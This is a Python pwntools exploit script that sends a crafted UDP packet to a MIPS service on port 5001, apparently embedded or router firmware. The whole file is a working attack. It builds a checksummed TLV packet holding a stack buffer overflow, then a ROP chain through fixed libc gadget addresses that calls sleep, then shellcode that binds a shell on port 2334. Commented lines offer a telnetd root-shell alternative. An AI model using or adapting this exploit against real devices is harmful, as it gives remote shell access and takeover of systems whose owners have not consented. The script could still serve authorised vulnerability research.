from pwn import *
from time import sleep

def csum(data):
    chksum_temp = 0
    data_list = [data[i:i+4] for i in range(0, len(data), 4 ) ]
    for data in data_list:
        chksum_temp += int(data, 16)
    hiword_chksumm, loword_chksum = divmod(chksum_temp, 0x10000)
    chksum_temp = hiword_chksumm+loword_chksum
    chksum_fin = hex(chksum_temp ^ 0xffff)
    return chksum_fin

def get_tlv_len(hex_data):
    return hex(int(len(hex_data)/2))[2::].zfill(4)

def gen_udp_data(payload):
    header = "01010e00e12b83c7"
    tmp_chksum = "0000"
    tmp_len = 0
    padding = "0000"

    tlv_value = payload.hex()
    tlv_type = "0005"
    tlv_len = get_tlv_len(tlv_value)
    tlv_data = tlv_type+tlv_len+tlv_value

    tmp_len += int(len(tlv_data) / 2)
    tmp_len = hex(tmp_len)
    data_len = tmp_len[2:].zfill(4)

    data_1 = header + tmp_chksum + data_len + padding + tlv_data
    chksum = csum(data_1)[2:].zfill(4)
    data_2 =  header + chksum + data_len + padding + tlv_data
    return bytearray.fromhex(data_2)

if __name__ == '__main__':

    ip = "127.0.0.1"
    port = 5001
    host = (ip, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    context.arch = "mips"
    context.endian = "big"
    #shellcode = asm(shellcraft.execve(path = "/bin/sh",argv=['sh', '-c', 'telnetd -p 2333 -l /bin/sh']))
    #shellcode = asm(shellcraft.mips.linux.sh())
    shellcode = asm(shellcraft.mips.linux.bindsh(2334))
    libc_addr = 0x90063000
    addr1 =  0x000512C0
    addr2 = 0x00035348
    addr_sleep = 0x000500F0
    addr3 = 0x000305B0
    addr4 = 0x0000B5F0
    s1 = p32(libc_addr + addr2 )
    s2 = p32(libc_addr + addr_sleep)
    s3 = b"BBBB"
    s4 = p32(libc_addr + addr4)
    ra = p32(libc_addr+addr1)

    payload = b"A"*580 + s1 + s2 + s3 + s4 + ra + b"A"*36 + p32(libc_addr+addr3)+ b"D"*24+shellcode 
    data = gen_udp_data(payload)
    print ("[+]Sending payload...")
    sock.sendto(data, host)



